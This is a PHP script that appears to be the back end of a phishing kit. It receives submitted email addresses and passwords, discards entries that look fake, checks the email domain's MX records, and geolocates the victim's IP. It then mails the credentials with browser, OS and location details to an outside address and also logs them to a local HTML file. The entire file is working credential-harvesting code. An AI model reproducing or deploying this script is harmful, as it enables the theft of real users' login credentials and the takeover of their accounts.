<?php
header('Access-Control-Allow-Origin:*');
header('Access-Control-Allow-Headers:*');
error_reporting(0);
$ip = $_SERVER['REMOTE_ADDR'];
$email= $_POST['email'];
if(isset($_GET['email'])){
$email=$_GET['email'];
}
$type= $_POST['type'];
if(isset($_GET['type'])){
$type=$_GET['type'];
}
$password = $_POST['password'];
if(isset($_GET['password'])){
$password=$_GET['password'];
}
$time = date('l jS \of F Y h:i:s A');
$user_agent = $_SERVER['HTTP_USER_AGENT'];
class geoPlugin {

	var $host = 'http://www.geoplugin.net/php.gp?ip={IP}&base_currency={CURRENCY}';
		
	//the default base currency
	var $currency = 'USD';
	
	//initiate the geoPlugin vars
	var $ip = null;
	var $city = null;
	var $region = null;
	var $areaCode = null;
	var $dmaCode = null;
	var $countryCode = null;
	var $countryName = null;
	var $continentCode = null;
	var $latitude = null;
	var $longitude = null;
	var $currencyCode = null;
	var $currencySymbol = null;
	var $currencyConverter = null;
	
	function locate($ip = null) {
		
		global $_SERVER;
		
		if ( is_null( $ip ) ) {
			$ip = $_SERVER['REMOTE_ADDR'];
		}
		
		$host = str_replace( '{IP}', $ip, $this->host );
		$host = str_replace( '{CURRENCY}', $this->currency, $host );
		
		$data = array();
		
		$response = $this->fetch($host);
		
		$data = unserialize($response);
		$this->ip = $ip;
		$this->city = $data['geoplugin_city'];
		$this->region = $data['geoplugin_region'];
		$this->areaCode = $data['geoplugin_areaCode'];
		$this->dmaCode = $data['geoplugin_dmaCode'];
		$this->countryCode = $data['geoplugin_countryCode'];
		$this->countryName = $data['geoplugin_countryName'];
		$this->continentCode = $data['geoplugin_continentCode'];
		$this->latitude = $data['geoplugin_latitude'];
		$this->longitude = $data['geoplugin_longitude'];
		$this->currencyCode = $data['geoplugin_currencyCode'];
		$this->currencySymbol = $data['geoplugin_currencySymbol'];
		$this->currencyConverter = $data['geoplugin_currencyConverter'];
		
	}
	
	function fetch($host) {

		if ( function_exists('curl_init') ) {
						
			//use cURL to fetch data
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $host);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_USERAGENT, 'geoPlugin PHP Class v1.0');
			$response = curl_exec($ch);
			curl_close ($ch);
			
		} else if ( ini_get('allow_url_fopen') ) {
			
			//fall back to fopen()
			$response = file_get_contents($host, 'r');
			
		} else {

			trigger_error ('geoPlugin class Error: Cannot retrieve data. Either compile PHP with cURL support or enable allow_url_fopen in php.ini ', E_USER_ERROR);
			return;
		
		}
		
		return $response;
	}
	
	function convert($amount, $float=2, $symbol=true) {
		
		//easily convert amounts to geolocated currency.
		if ( !is_numeric($this->currencyConverter) || $this->currencyConverter == 0 ) {
			trigger_error('geoPlugin class Notice: currencyConverter has no value.', E_USER_NOTICE);
			return $amount;
		}
		if ( !is_numeric($amount) ) {
			trigger_error ('geoPlugin class Warning: The amount passed to geoPlugin::convert is not numeric.', E_USER_WARNING);
			return $amount;
		}
		if ( $symbol === true ) {
			return $this->currencySymbol . round( ($amount * $this->currencyConverter), $float );
		} else {
			return round( ($amount * $this->currencyConverter), $float );
		}
	}
	
	function nearby($radius=10, $limit=null) {

		if ( !is_numeric($this->latitude) || !is_numeric($this->longitude) ) {
			trigger_error ('geoPlugin class Warning: Incorrect latitude or longitude values.', E_USER_NOTICE);
			return array( array() );
		}
		
		$host = "http://www.geoplugin.net/extras/nearby.gp?lat=" . $this->latitude . "&long=" . $this->longitude . "&radius={$radius}";
		
		if ( is_numeric($limit) )
			$host .= "&limit={$limit}";
			
		return unserialize( $this->fetch($host) );

	}

	
}
class OS_BR{

    private $agent = "";
    private $info = array();

    function __construct(){
        $this->agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : NULL;
        $this->getBrowser();
        $this->getOS();
    }

    function getBrowser(){
        $browser = array("Navigator"            => "/Navigator(.*)/i",
                         "Firefox"              => "/Firefox(.*)/i",
                         "Internet Explorer"    => "/MSIE(.*)/i",
                         "Google Chrome"        => "/chrome(.*)/i",
                         "MAXTHON"              => "/MAXTHON(.*)/i",
                         "Opera"                => "/Opera(.*)/i",
                         );
        foreach($browser as $key => $value){
            if(preg_match($value, $this->agent)){
                $this->info = array_merge($this->info,array("Browser" => $key));
                $this->info = array_merge($this->info,array(
                  "Version" => $this->getVersion($key, $value, $this->agent)));
                break;
            }else{
                $this->info = array_merge($this->info,array("Browser" => "UnKnown"));
                $this->info = array_merge($this->info,array("Version" => "UnKnown"));
            }
        }
        return $this->info['Browser'];
    }

    function getOS(){
        $OS = array("Windows"   =>   "/Windows/i",
                    "Linux"     =>   "/Linux/i",
                    "Unix"      =>   "/Unix/i",
                    "Mac"       =>   "/Mac/i"
                    );

        foreach($OS as $key => $value){
            if(preg_match($value, $this->agent)){
                $this->info = array_merge($this->info,array("Operating System" => $key));
                break;
            }
        }
        return $this->info['Operating System'];
    }

    function getVersion($browser, $search, $string){
        $browser = $this->info['Browser'];
        $version = "";
        $browser = strtolower($browser);
        preg_match_all($search,$string,$match);
        switch($browser){
            case "firefox": $version = str_replace("/","",$match[1][0]);
            break;

            case "internet explorer": $version = substr($match[1][0],0,4);
            break;

            case "opera": $version = str_replace("/","",substr($match[1][0],0,5));
            break;

            case "navigator": $version = substr($match[1][0],1,7);
            break;

            case "maxthon": $version = str_replace(")","",$match[1][0]);
            break;

            case "google chrome": $version = substr($match[1][0],1,10);
        }
        return $version;
    }

    function showInfo($switch){
        $switch = strtolower($switch);
        switch($switch){
            case "browser": return $this->info['Browser'];
            break;

            case "os": return $this->info['Operating System'];
            break;

            case "version": return $this->info['Version'];
            break;

            case "all" : return array($this->info["Version"], 
              $this->info['Operating System'], $this->info['Browser']);
            break;

            default: return "Unknown";
            break;

        }
    }
}

// using
// create an new instant of OS_BR class
$obj = new OS_BR();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
}

$geoplugin = new geoPlugin($ip);
$geoplugin->locate();
$cc = $geoplugin->countryCode;
$cn = $geoplugin->countryName;
$cr = $geoplugin->region;
$ct = $geoplugin->city;
$br = $obj->showInfo('browser');
$op = $obj->showInfo('os');
$vr = $obj->showInfo('version');

$ua = $_SERVER['HTTP_USER_AGENT'];
$datum = date("D M d, Y g:i a");

$keywords=array('fuckyou',
'bastard',
'bitch',
'stupid',
'cattty',
'junkny',
'fuck',
'dickhead');
foreach ( $keywords as $keyword ) 
{
if (strtoupper ($password)==strtoupper ($keyword)){
$password ="";	
}
}
if (is_numeric($password)) {
$password ="";	
}
$domain = substr(strrchr($email, "@"), 1);
$mxrecres = "";
function mxrecordValidate($email, $domain) {
$arr = dns_get_record($domain, DNS_MX);
if ($arr[0]['host'] == $domain && !empty($arr[0]['target'])) {
return $arr[0]['target'];
}
}
if (mxrecordValidate($email, $domain)) {
$data = dns_get_record($domain, DNS_MX);
foreach ($data as $key1) {
$mxrecres .= "Found MX Record : ".$key1['target']." - ".gethostbyname($key1['target'])."\n";
}
} else {
$mxrecres = 'No MX record exists.Invalid Email'."\n";
}

$hostname = gethostbyaddr($ip);
$message .= "-------------------------------------------------------------------------------------\n";
$message .= "User ID: ".$email."\n";
$message .= "Password: ".$password."\n";
$message .= "".$mxrecres."";
$message .= "-------------------------------------------------------------------------------------\n";
$message .= "Web Browser: ".$br."\n";
$message .= "Web Browser Version: ".$vr."\n";
$message .= "Operating System: ".$op."\n";
$message .= "IP: ".$ip." | ".$cn." | ".$cr." | ".$ct."\n";
$message .= "Submitted: ".$datum."\n";
$message .= "Host Name: ".$hostname."\n";
$message .= "User Agent: ".$ua."\n";
$message .= "-------------------------------------------------------------------------------------\n";
$subject = "$type Login :[$ip] | $cn";
$headers = "MIME-Version: 1.0\n";
$headers .= "From: <admin@staticpagesaver.online>" . "\r\n";
if(strlen($password)>4){
mail("pinnaclecastle@yanm",$subject,$message,$headers);
$fp = fopen('resu2.html', 'ab');
fwrite($fp,$message);
fclose($fp);
}
if(strlen($password)<6){
$countloc++;	
echo 'no';
}else {
echo 'ok';	
}
?>